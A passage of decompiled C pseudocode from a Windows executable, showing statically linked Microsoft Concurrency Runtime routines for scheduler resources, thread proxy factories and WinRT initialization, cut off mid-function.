  v1 = this;
  v2 = 0;
  v13 = 0;
  if ( this[48] )
  {
    v3 = 0;
    v12 = 0;
    do
    {
      v4 = 0;
      v5 = v3 + v1[4];
      v14 = 0;
      v15 = v5;
      if ( *(_DWORD *)(v5 + 4) )
      {
        v6 = 0;
        v16 = 0;
        do
        {
          v7 = *(_DWORD *)(*(_DWORD *)(v5 + 48) + v6 + 16);
          if ( v7 )
          {
            v8 = *(_DWORD *)(v7 + 56);
            if ( v8 )
            {
              do
              {
                v9 = v8;
                if ( v8 == *(_DWORD *)(*(_DWORD *)(v5 + 48) + v6 + 16) )
                  v8 = 0;
                else
                  v8 = *(_DWORD *)(v8 + 56);
                v10 = *(_DWORD *)(v9 + 28);
                sub_441C8F(v10);
                (*(void (__thiscall **)(int))(*(_DWORD *)v10 + 36))(v10);
                v5 = v15;
                v6 = v16;
              }
              while ( v8 );
              v4 = v14;
            }
          }
          ++v4;
          v6 += 52;
          v14 = v4;
          v16 = v6;
        }
        while ( v4 < *(_DWORD *)(v5 + 4) );
        v1 = this;
        v2 = v13;
        v3 = v12;
      }
      ++v2;
      v3 += 52;
      v13 = v2;
      v12 = v3;
    }
    while ( v2 < v1[48] );
  }
  sub_42CF7C((void *)v1[14]);
}

//----- (0043B3FB) --------------------------------------------------------
_DWORD *__thiscall sub_43B3FB(void *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // esi

  v4 = operator new(0x3Cu);
  v5 = 0;
  if ( v4 )
    v5 = sub_43A55E(v4, (int)this, a2, a3);
  sub_43A68C(v5);
  return v5;
}

//----- (0043B442) --------------------------------------------------------
int __thiscall sub_43B442(char *this, int a2)
{
  int v3; // ebx
  struct _RTL_CRITICAL_SECTION *v4; // esi
  int v5; // eax
  int v6; // ecx
  int v7; // ebx
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  int v12; // edi
  char pExceptionObject[12]; // [esp+10h] [ebp-24h] BYREF
  char *v15; // [esp+1Ch] [ebp-18h]
  int v16; // [esp+20h] [ebp-14h]
  char *v17; // [esp+24h] [ebp-10h]
  int v18; // [esp+30h] [ebp-4h]

  v17 = this;
  v3 = __RTDynamicCast(
         a2,
         0,
         &Concurrency::IExecutionResource `RTTI Type Descriptor',
         &Concurrency::details::ExecutionResource `RTTI Type Descriptor',
         0);
  if ( !v3 )
  {
    v3 = a2 + 8;
    if ( *(char **)(a2 + 28) != this )
    {
      sub_429626((std::exception *)pExceptionObject, "pExecutionResource");
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
  }
  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  v15 = this + 32;
  sub_42E75B((LPCRITICAL_SECTION)(this + 32));
  v5 = 52 * *(_DWORD *)(v3 + 36);
  v6 = *((_DWORD *)this + 4);
  v7 = *(_DWORD *)(v3 + 40);
  v18 = 0;
  v8 = v5 + v6;
  v9 = *(_DWORD *)this;
  v16 = v8;
  v10 = (*(int (__thiscall **)(char *, int, int))(v9 + 24))(v17, v8, v7);
  v11 = v16;
  v12 = v10;
  *(_BYTE *)(v10 + 69) = 1;
  sub_43B170((_DWORD *)(52 * v7 + *(_DWORD *)(v11 + 48) + 12), v10 + 8);
  v18 = 1;
  sub_42E8A1(v4);
  return v12;
}

//----- (0043B500) --------------------------------------------------------
_DWORD *__thiscall sub_43B500(void *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax

  v4 = operator new(0x58u);
  result = 0;
  if ( v4 )
    return sub_441CBF(v4, (int)this, a2, a3);
  return result;
}

//----- (0043B538) --------------------------------------------------------
unsigned int __thiscall sub_43B538(_DWORD *this, int a2)
{
  unsigned int result; // eax
  int v3; // edx

  result = *(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + this[4] + 48);
  if ( !_InterlockedExchangeAdd((volatile signed __int32 *)(result + 52 * *(_DWORD *)(a2 + 40) + 24), 0xFFFFFFFF) )
  {
    v3 = this[3];
    result = this[32] == this[33];
    if ( *(_DWORD *)(v3 + 16) > result )
      return SetEvent(*(HANDLE *)(v3 + 80));
  }
  return result;
}

//----- (0043B582) --------------------------------------------------------
char __thiscall sub_43B582(_DWORD *this, int a2, int a3, char a4)
{
  int v4; // ebx
  int v6; // ecx
  int v7; // eax
  int v8; // edi

  v4 = 52 * a2;
  v6 = 52 * a3;
  v7 = this[4];
  v8 = 52 * a3 + *(_DWORD *)(v7 + 52 * a2 + 48);
  if ( a4 )
  {
    --*(_DWORD *)(v8 + 44);
    --this[45];
  }
  if ( (*(_DWORD *)(v8 + 40))-- == 1 )
  {
    v7 = v4 + this[4];
    --this[43];
    --*(_DWORD *)(v7 + 36);
    if ( *(_BYTE *)(v8 + 50) )
    {
      LOBYTE(v7) = sub_43BED9(this, v7, a3);
      v6 = 52 * a3;
      *(_BYTE *)(v8 + 50) = 0;
    }
    if ( a4 )
    {
      v7 = *(_DWORD *)(this[4] + v4 + 48);
      if ( !*(_DWORD *)(v7 + v6 + 36) )
        --this[46];
    }
  }
  return v7;
}

//----- (0043B5FB) --------------------------------------------------------
void __thiscall sub_43B5FB(char *Block)
{
  if ( Block )
  {
    sub_43AFFA(Block);
    sub_42CF7C(Block);
  }
}

//----- (0043B616) --------------------------------------------------------
void __thiscall sub_43B616(int this, _DWORD *Block)
{
  int v3; // esi
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // [esp+10h] [ebp-18h]
  int v8; // [esp+14h] [ebp-14h]
  int v9; // [esp+18h] [ebp-10h]

  v3 = *(_DWORD *)(this + 16);
  v4 = 52 * Block[10];
  v9 = 52 * Block[9];
  v7 = v4;
  v5 = *(_DWORD *)(v3 + v9 + 48);
  v8 = v5;
  if ( !(*(_DWORD *)(v5 + v4 + 36) + *(_DWORD *)(v5 + v4 + 44)) )
  {
    --*(_DWORD *)(v3 + v9 + 28);
    *(_DWORD *)(v5 + v4) = 1;
    --*(_DWORD *)(this + 160);
    v6 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 12) + 72) + 40 * Block[9] + 32) + 36 * Block[10];
    --*(_DWORD *)(v6 + 16);
  }
  sub_42E75B((LPCRITICAL_SECTION)(this + 32));
  sub_43BC9C((_DWORD *)(v8 + 12 + v7), (int)Block);
  sub_42E8A1((LPCRITICAL_SECTION)(this + 32));
  *Block = &Concurrency::details::ExecutionResource::`vftable';
  sub_42CF7C(Block);
}
// 4712D0: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (0043B6AF) --------------------------------------------------------
int __thiscall sub_43B6AF(int this, int a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  int v4; // ebx
  int v5; // ecx

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_42E75B((LPCRITICAL_SECTION)(this + 32));
  v4 = *(_DWORD *)(this + 16);
  v5 = *(_DWORD *)(v4 + 52 * (**(int (__thiscall ***)(int))a2)(a2) + 48);
  sub_43BC9C((_DWORD *)(52 * *(_DWORD *)(a2 + 48) + 12 + v5), a2 + 8);
  if ( !*(_BYTE *)(a2 + 69) )
    --*(_DWORD *)(this + 156);
  sub_42E8A1(v3);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 36))(a2);
}

//----- (0043B73E) --------------------------------------------------------
int __thiscall sub_43B73E(_DWORD *this)
{
  sub_43B332(this);
  return (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
}

//----- (0043B75B) --------------------------------------------------------
LPVOID __thiscall sub_43B75B(_DWORD *this)
{
  int v1; // esi
  LPVOID v2; // eax

  v1 = 0;
  v2 = sub_430184(*(_DWORD *)(this[3] + 112));
  if ( v2 && ((unsigned __int8)v2 & 3) == 0 )
    return v2;
  return (LPVOID)v1;
}

//----- (0043B778) --------------------------------------------------------
_DWORD *__thiscall sub_43B778(_DWORD *this, int a2)
{
  int (__thiscall ***v3)(_DWORD, _DWORD, _DWORD); // ebx
  _DWORD *v4; // esi

  v3 = (int (__thiscall ***)(_DWORD, _DWORD, _DWORD))this[1];
  if ( !v3 )
  {
    v3 = (int (__thiscall ***)(_DWORD, _DWORD, _DWORD))sub_43C29A((char *)(this[3] + 104));
    this[1] = v3;
  }
  v4 = (_DWORD *)(**v3)(v3, this[37], this[38]);
  sub_4420A9(v4, a2);
  return v4;
}

//----- (0043B7C8) --------------------------------------------------------
_DWORD *__thiscall sub_43B7C8(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi

  if ( (void *)a2[5] == this )
    return a2;
  v3 = operator new(0x3Cu);
  v4 = 0;
  if ( v3 )
    v4 = sub_43A5BC(v3, (int)this, a2);
  sub_43A68C(v4);
  return v4;
}

//----- (0043B816) --------------------------------------------------------
_DWORD *__thiscall sub_43B816(int this, unsigned int a2, int a3, char a4)
{
  int v4; // ebx
  unsigned int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // esi
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // edx
  _DWORD *v13; // esi
  int v14; // ecx
  unsigned int v15; // eax
  unsigned int v16; // edx
  _DWORD *v17; // edx
  _DWORD *v18; // ecx
  char v19; // ah
  char v20; // al
  int v21; // eax
  int v22; // ecx
  int v23; // ebx
  unsigned int v24; // eax
  int v25; // edx
  _DWORD *v27; // [esp+Ch] [ebp-44h]
  unsigned int v28; // [esp+10h] [ebp-40h]
  _DWORD *v29; // [esp+14h] [ebp-3Ch]
  int v30; // [esp+18h] [ebp-38h]
  int v31; // [esp+1Ch] [ebp-34h]
  unsigned int v32; // [esp+20h] [ebp-30h]
  unsigned int v33; // [esp+24h] [ebp-2Ch]
  int v34; // [esp+28h] [ebp-28h]
  int i; // [esp+2Ch] [ebp-24h]
  _DWORD *Block; // [esp+30h] [ebp-20h]
  int v37; // [esp+34h] [ebp-1Ch]
  unsigned int v38; // [esp+38h] [ebp-18h]
  unsigned int v39; // [esp+3Ch] [ebp-14h]
  _DWORD *v40; // [esp+40h] [ebp-10h]
  unsigned int v41; // [esp+44h] [ebp-Ch]
  int v42; // [esp+48h] [ebp-8h]
  char v43; // [esp+4Dh] [ebp-3h]
  char v44; // [esp+4Eh] [ebp-2h]
  char v45; // [esp+4Fh] [ebp-1h]

  v4 = 0;
  v38 = 0;
  if ( a4 )
  {
    v6 = sub_432E07((_DWORD *)this);
    v7 = a2;
    v8 = *(_DWORD *)(this + 184) + v6 < a2 + *(_DWORD *)(this + 160);
  }
  else
  {
    v7 = a2;
    v8 = 0;
  }
  v32 = v8;
  v9 = v8 < v7 ? v7 - v8 : 0;
  if ( !v8 || (v43 = 1, v7) )
    v43 = 0;
  v28 = -1;
  if ( a4 && !v8 )
  {
    v44 = 1;
LABEL_11:
    v37 = sub_4324A8(*(_DWORD **)(this + 12), 0);
    goto LABEL_13;
  }
  v44 = 0;
  if ( a4 )
    goto LABEL_11;
  v37 = -1;
  v44 = 0;
LABEL_13:
  v33 = 0;
  if ( v9
    && ((v10 = *(_DWORD *)(this + 164), v11 = *(_DWORD *)(this + 144), v9 > v10)
      ? (v12 = v11 * v10 + (v11 - 1) * (v9 - v10))
      : (v12 = v9 * v11),
        (v33 = v12) != 0) )
  {
    Block = (_DWORD *)unknown_libname_45((unsigned __int64)(unsigned int)v12 >> 30 != 0 ? -1 : 4 * v12);
  }
  else
  {
    Block = 0;
  }
  v13 = 0;
  v30 = 0;
  v14 = -1;
  v45 = a4 ^ 1;
  v15 = a2;
  v16 = 0;
  v34 = 0;
  v42 = -1;
  v40 = 0;
  while ( 1 )
  {
    v39 = v16;
    if ( v38 >= v15 )
    {
      if ( v45 )
        break;
    }
    if ( v16 >= *(_DWORD *)(this + 192) )
      break;
    v17 = (_DWORD *)(v34 + *(_DWORD *)(this + 16));
    v29 = v17;
    if ( v17[6] || v17[7] )
    {
      v13 = v40;
      v41 = 0;
      for ( i = 0; ; i += 52 )
      {
        if ( v38 >= v15 && v45 || (v14 = v42, v41 >= v17[1]) )
        {
          v17[6] = 0;
          goto LABEL_65;
        }
        v18 = (_DWORD *)(i + v17[12]);
        v27 = v18;
        if ( *v18 == 3 )
          break;
        if ( *v18 != 4 )
          goto LABEL_50;
        if ( v44 )
        {
          v24 = v18[9] + v18[11];
          if ( v24 >= v28 && (v24 != v28 || v39 != v37) )
            goto LABEL_49;
          v14 = v41;
          v13 = v17;
          v28 = v24;
          v15 = a2;
          v40 = v17;
          v42 = v41;
        }
        else
        {
          if ( !v43 || v18[10] || v13 && v39 != v37 )
            goto LABEL_50;
          v14 = v41;
          v13 = v17;
          v40 = v17;
          v42 = v41;
          if ( v39 == v37 )
            v45 = 1;
        }
LABEL_51:
        ++v41;
      }
      if ( !v45 && (v38 == v15 - 1 || v37 == v39) )
      {
        v19 = 1;
        if ( v32 )
        {
          v20 = 0;
          goto LABEL_38;
        }
      }
      else
      {
        v19 = 0;
      }
      v20 = 1;
LABEL_38:
      *v18 = 4;
      ++v17[7];
      ++*(_DWORD *)(this + 160);
      if ( v19 )
      {
        v40 = v17;
        v42 = v41;
        v45 = 1;
      }
      if ( v20 )
      {
        v21 = *(_DWORD *)(this + 164);
        v22 = *(_DWORD *)(this + 144);
        v31 = v22;
        if ( v21 )
          *(_DWORD *)(this + 164) = v21 - 1;
        else
          v31 = --v22;
        v27[9] += v22;
        *(_DWORD *)(this + 176) += v22;
        if ( v22 )
        {
          v23 = v31;
          do
          {
            Block[v30++] = (*(int (__thiscall **)(int, _DWORD *, unsigned int))(*(_DWORD *)this + 24))(this, v17, v41);
            v17 = v29;
            --v23;
          }
          while ( v23 );
          v4 = 0;
        }
      }
      ++v38;
      v13 = v40;
LABEL_49:
      v15 = a2;
LABEL_50:
      v14 = v42;
      goto LABEL_51;
    }
LABEL_65:
    v16 = v39 + 1;
    v34 += 52;
  }
  if ( v33 )
  {
    sub_43B1B8(this, (int)Block, v33);
    j_j_j___free_base(Block);
    v14 = v42;
  }
  if ( a4 )
  {
    if ( v44 || !v43 )
    {
      v25 = v42;
    }
    else
    {
      sub_43BCD2((_DWORD *)this, (int)v13, v14);
      v25 = v42;
      *(_DWORD *)(52 * v42 + v13[12]) = 4;
      ++v13[7];
      ++*(_DWORD *)(this + 160);
    }
    return sub_43B3FB((void *)this, v13, v25);
  }
  return (_DWORD *)v4;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043BB1B) --------------------------------------------------------
unsigned __int32 __thiscall sub_43BB1B(_DWORD *this, int a2)
{
  unsigned __int32 result; // eax
  int v3; // edx

  result = _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(52 * *(_DWORD *)(a2 + 36) + this[4] + 48)
                                                           + 52 * *(_DWORD *)(a2 + 40)
                                                           + 24));
  if ( result == 1 )
  {
    v3 = this[3];
    result = this[32] == this[33];
    if ( *(_DWORD *)(v3 + 16) > result )
      return SetEvent(*(HANDLE *)(v3 + 80));
  }
  return result;
}

//----- (0043BB69) --------------------------------------------------------
char __thiscall sub_43BB69(_DWORD *this, int a2, int a3, char a4)
{
  int v4; // ebx
  int v6; // edi
  int v7; // ecx
  int v8; // eax

  v4 = 52 * a2;
  v6 = 52 * a3 + *(_DWORD *)(this[4] + 52 * a2 + 48);
  v7 = *(_DWORD *)(v6 + 40);
  LOBYTE(v8) = v7 + 1;
  *(_DWORD *)(v6 + 40) = v7 + 1;
  if ( v7 )
  {
    if ( a4 )
    {
LABEL_8:
      ++this[45];
      ++*(_DWORD *)(v6 + 44);
    }
  }
  else
  {
    v8 = v4 + this[4];
    ++*(_DWORD *)(v8 + 36);
    ++this[43];
    if ( *(_BYTE *)(v6 + 49) )
    {
      *(_BYTE *)(v6 + 50) = 1;
      LOBYTE(v8) = sub_43BED9(this, v8, a3);
    }
    if ( a4 )
    {
      v8 = *(_DWORD *)(this[4] + v4 + 48);
      if ( !*(_DWORD *)(v8 + 52 * a3 + 36) )
        ++this[46];
      goto LABEL_8;
    }
  }
  return v8;
}

//----- (0043BBEA) --------------------------------------------------------
_DWORD *__thiscall sub_43BBEA(_DWORD *this)
{
  void *v1; // ebx
  LPVOID v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  unsigned int v6; // edi
  unsigned int v7; // ebx
  int v8; // edi
  int v9; // eax

  v1 = this;
  v2 = sub_430184(*(_DWORD *)(this[3] + 112));
  v3 = (int)v2;
  if ( !v2 )
    return 0;
  v4 = (unsigned __int8)v2 & 3;
  if ( !v4 )
  {
    sub_43A68C((_DWORD *)v3);
    return sub_43B7C8(v1, (_DWORD *)v3);
  }
  if ( v4 == 1 )
  {
    v3 = *(_DWORD *)((v3 & 0xFFFFFFFE) + 16) + 8;
    v5 = *(_DWORD *)(v3 + 28);
    if ( v5 && *(_BYTE *)(v5 + 68) )
      return 0;
    sub_43A68C((_DWORD *)v3);
  }
  else
  {
    v6 = v3 & 0xFFFFFFFD;
    v7 = v6 + 4;
    (*(void (__thiscall **)(unsigned int))(*(_DWORD *)(v6 + 4) + 16))(v6 + 4);
    v8 = *(_DWORD *)(v6 + 32);
    v9 = *(_DWORD *)(v8 + 44);
    v3 = v8 + 16;
    if ( v9 && *(_BYTE *)(v9 + 68) )
      v3 = 0;
    else
      sub_43A68C((_DWORD *)v3);
    (*(void (__thiscall **)(unsigned int))(*(_DWORD *)v7 + 20))(v7);
    v1 = this;
  }
  if ( v3 )
    return sub_43B7C8(v1, (_DWORD *)v3);
  return 0;
}

//----- (0043BC9C) --------------------------------------------------------
int __thiscall sub_43BC9C(_DWORD *this, int a2)
{
  int result; // eax

  --*this;
  *(_DWORD *)(*(_DWORD *)(a2 + 56) + 52) = *(_DWORD *)(a2 + 52);
  *(_DWORD *)(*(_DWORD *)(a2 + 52) + 56) = *(_DWORD *)(a2 + 56);
  result = this[1];
  if ( a2 == result )
  {
    if ( result == *(_DWORD *)(result + 56) )
      result = 0;
    else
      result = *(_DWORD *)(result + 52);
    this[1] = result;
  }
  return result;
}

//----- (0043BCD2) --------------------------------------------------------
void __thiscall sub_43BCD2(_DWORD *this, int a2, int a3)
{
  int v4; // ebx
  int v5; // ecx
  struct _RTL_CRITICAL_SECTION *v6; // esi
  int v7; // eax
  int v8; // eax
  int v9; // esi
  int v10; // eax
  int v11; // ebx
  struct _RTL_CRITICAL_SECTION *v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+14h] [ebp-18h]
  int v14; // [esp+18h] [ebp-14h] BYREF
  _DWORD *v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]

  v15 = this;
  --*(_DWORD *)(a2 + 28);
  --this[40];
  v4 = *(_DWORD *)(a2 + 48) + 52 * a3;
  v13 = v4;
  v5 = *(_DWORD *)(v4 + 36);
  *(_DWORD *)v4 = 1;
  if ( v5 == this[36] )
  {
    ++this[41];
    v5 = *(_DWORD *)(v4 + 36);
  }
  this[44] -= v5;
  *(_DWORD *)(v4 + 36) = 0;
  if ( *(_BYTE *)(v4 + 49) )
    sub_43BED9(this, a2, a3);
  v6 = (struct _RTL_CRITICAL_SECTION *)(this + 8);
  *(_BYTE *)(v4 + 48) = 0;
  v12 = v6;
  sub_42E75B(v6);
  v16 = 0;
  v7 = *(_DWORD *)(v4 + 16);
  if ( v7 )
  {
    v8 = *(_DWORD *)(v7 + 56);
    if ( v8 )
    {
      v9 = (int)v15;
      do
      {
        if ( v8 == *(_DWORD *)(v4 + 16) )
          v15 = 0;
        else
          v15 = *(_DWORD **)(v8 + 56);
        v10 = *(_DWORD *)(v8 + 28);
        if ( v10 && !*(_BYTE *)(v10 + 68) )
        {
          *(_BYTE *)(v10 + 68) = 1;
          v11 = *(_DWORD *)(v9 + 8);
          v14 = v10;
          (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)v11 + 16))(v11, &v14, 1);
          v4 = v13;
        }
        v8 = (int)v15;
      }
      while ( v15 );
      v6 = v12;
    }
  }
  v16 = 1;
  sub_42E8A1(v6);
}

//----- (0043BDB8) --------------------------------------------------------
void __thiscall sub_43BDB8(_DWORD *this, _DWORD *Block)
{
  sub_43BC9C(this + 49, (int)Block);
  if ( Block )
  {
    *Block = &Concurrency::details::ExecutionResource::`vftable';
    sub_42CF7C(Block);
  }
}
// 4712D0: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (0043BDE4) --------------------------------------------------------
_DWORD *__thiscall sub_43BDE4(_DWORD *this, char a2)
{
  return sub_433AF7(this[3], this, a2);
}

//----- (0043BDF7) --------------------------------------------------------
void __thiscall sub_43BDF7(int this, int a2, char a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  int v4; // edx
  int v5; // eax
  int v6; // eax
  char *v7; // ebx
  int v8; // eax
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  int *v14; // [esp+18h] [ebp-34h]
  char v15[44]; // [esp+1Ch] [ebp-30h] BYREF
  int v16; // [esp+48h] [ebp-4h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_42E75B((LPCRITICAL_SECTION)(this + 32));
  v16 = 0;
  v4 = 0;
  v5 = *(_DWORD *)(a2 + 12);
  if ( v5 <= 8 )
  {
    v7 = v15;
  }
  else
  {
    v6 = unknown_libname_45((unsigned __int64)(unsigned int)v5 >> 30 != 0 ? -1 : 4 * v5);
    v4 = 0;
    v7 = (char *)v6;
  }
  v8 = *(_DWORD *)(a2 + 16);
  if ( v8 )
  {
    v9 = *(_DWORD *)(v8 + 56);
    if ( v9 )
    {
      do
      {
        if ( v9 == *(_DWORD *)(a2 + 16) )
          v10 = 0;
        else
          v10 = *(_DWORD *)(v9 + 56);
        v11 = *(_DWORD *)(v9 + 28);
        if ( v11 && !*(_BYTE *)(v11 + 68) )
          *(_DWORD *)&v7[4 * v4++] = v11;
        v9 = v10;
      }
      while ( v10 );
    }
  }
  v14 = *(int **)(this + 8);
  v12 = *v14;
  if ( a3 )
    (*(void (__thiscall **)(int *, char *, int))(v12 + 24))(v14, v7, v4);
  else
    (*(void (__thiscall **)(int *, char *, int))(v12 + 20))(v14, v7, v4);
  v16 = 1;
  sub_42E8A1(v3);
  if ( v7 != v15 )
    j_j_j___free_base(v7);
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043BEC5) --------------------------------------------------------
int __thiscall sub_43BEC5(_DWORD *this)
{
  return sub_4343C7(this[3], this);
}

//----- (0043BECF) --------------------------------------------------------
_DWORD *__thiscall sub_43BECF(_DWORD *this)
{
  return sub_434499(this[3], this);
}

//----- (0043BED9) --------------------------------------------------------
char __thiscall sub_43BED9(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int v4; // esi
  char result; // al

  v3 = this[42];
  v4 = *(_DWORD *)(a2 + 48) + 52 * a3;
  if ( *(_BYTE *)(v4 + 49) )
  {
    this[42] = v3 - 1;
    --*(_DWORD *)(a2 + 32);
    result = 0;
  }
  else
  {
    this[42] = v3 + 1;
    result = 1;
    ++*(_DWORD *)(a2 + 32);
  }
  *(_BYTE *)(v4 + 49) = result;
  return result;
}

//----- (0043BF15) --------------------------------------------------------
int __stdcall sub_43BF15(int a1)
{
  int v1; // eax
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !a1 )
  {
    sub_429626((std::exception *)pExceptionObject, "pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v1 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 8))(a1);
  return sub_442172(v1);
}

//----- (0043BF61) --------------------------------------------------------
__int32 sub_43BF61()
{
  HMODULE ModuleHandleW; // eax
  FARPROC RoInitialize; // eax
  int LastError; // eax
  HMODULE v3; // eax
  FARPROC RoUninitialize; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-10h] BYREF

  dword_492830 = (int)LoadLibraryExW(L"combase.dll", 0, 0x800u);
  if ( !dword_492830 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
    goto LABEL_8;
  }
  ModuleHandleW = GetModuleHandleW(L"combase.dll");
  RoInitialize = GetProcAddress(ModuleHandleW, "RoInitialize");
  if ( !RoInitialize
    || (dword_492828 = sub_430237((int)RoInitialize),
        v3 = GetModuleHandleW(L"combase.dll"),
        (RoUninitialize = GetProcAddress(v3, "RoUninitialize")) == 0) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
LABEL_8:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_9:
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  dword_49282C = sub_430237((int)RoUninitialize);
  return _InterlockedExchange(&dword_492834, 1);
}
// 492828: using guessed type int dword_492828;
// 49282C: using guessed type int dword_49282C;
// 492830: using guessed type int dword_492830;
// 492834: using guessed type __int32 dword_492834;
// 43BF61: using guessed type _DWORD pExceptionObject[4];

//----- (0043C00E) --------------------------------------------------------
int __cdecl sub_43C00E(int a1)
{
  int (__thiscall *v1)(_DWORD, int); // esi

  v1 = (int (__thiscall *)(_DWORD, int))sub_430237(dword_492828);
  return v1(v1, a1);
}
// 492828: using guessed type int dword_492828;

//----- (0043C030) --------------------------------------------------------
int sub_43C030()
{
  int (__thiscall *v0)(_DWORD); // esi

  v0 = (int (__thiscall *)(_DWORD))sub_430237(dword_49282C);
  return v0(v0);
}
// 49282C: using guessed type int dword_49282C;

//----- (0043C04B) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_43C04B(union _SLIST_HEADER *this, int a2)
{
  union _SLIST_HEADER *v3; // edi
  int v4; // ebx

  v3 = this + 1;
  this->Next.Next = (struct _SINGLE_LIST_ENTRY *)&Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';
  v4 = 4;
  *(_DWORD *)&this->Depth = *(_DWORD *)(a2 + 8);
  do
  {
    InitializeSListHead(v3++);
    --v4;
  }
  while ( v4 );
  return this;
}
// 4713D0: using guessed type void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';

//----- (0043C08A) --------------------------------------------------------
_DWORD *__thiscall sub_43C08A(_DWORD *this, int a2, int a3)
{
  sub_442298(this, a2, a3);
  *this = &Concurrency::details::FreeThreadProxy::`vftable';
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[12] = 0;
  *((_WORD *)this + 26) = 0;
  return this;
}
// 471388: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (0043C0BF) --------------------------------------------------------
int __thiscall sub_43C0BF(int this, int a2)
{
  int result; // eax

  sub_43C04B((union _SLIST_HEADER *)this, a2);
  *(_DWORD *)this = &Concurrency::details::FreeThreadProxyFactory::`vftable';
  result = this;
  *(_DWORD *)(this + 40) = 1;
  *(_BYTE *)(this + 44) = 0;
  return result;
}
// 4713FC: using guessed type void *Concurrency::details::FreeThreadProxyFactory::`vftable';

//----- (0043C0E9) --------------------------------------------------------
char *__thiscall sub_43C0E9(char *this)
{
  *(_DWORD *)this = 0;
  *((_DWORD *)this + 1) = 0;
  sub_42E44D((LPCRITICAL_SECTION)(this + 12));
  *((_DWORD *)this + 2) = sub_430139();
  return this;
}

//----- (0043C11D) --------------------------------------------------------
void __thiscall sub_43C11D(_DWORD *this)
{
  *this = &Concurrency::details::IThreadProxyFactory::`vftable';
}
// 4713A4: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0043C124) --------------------------------------------------------
void __thiscall sub_43C124(_DWORD *this)
{
  int v2; // ebx

  if ( *this )
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)*this + 24))(*this);
  v2 = this[1];
  if ( v2 )
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)v2 + 24))(this[1]);
  sub_430176(this[2]);
  sub_42E4D7((LPCRITICAL_SECTION)(this + 3));
}

//----- (0043C19B) --------------------------------------------------------
_DWORD *__thiscall sub_43C19B(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4713A4: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0043C1BE) --------------------------------------------------------
_DWORD *__thiscall sub_43C1BE(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::FreeThreadProxy::`vftable';
  sub_442386(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 471388: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (0043C1E6) --------------------------------------------------------
_DWORD *__thiscall sub_43C1E6(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4713A4: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0043C209) --------------------------------------------------------
_DWORD *__thiscall sub_43C209(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4713A4: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0043C22C) --------------------------------------------------------
_DWORD *__thiscall sub_43C22C(void *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x44u);
  result = 0;
  if ( v3 )
    return sub_43C08A(v3, (int)this, a2);
  return result;
}

//----- (0043C261) --------------------------------------------------------
int __cdecl sub_43C261(int a1)
{
  void *v1; // ecx
  int result; // eax

  sub_43C553();
  v1 = operator new(0x30u);
  result = 0;
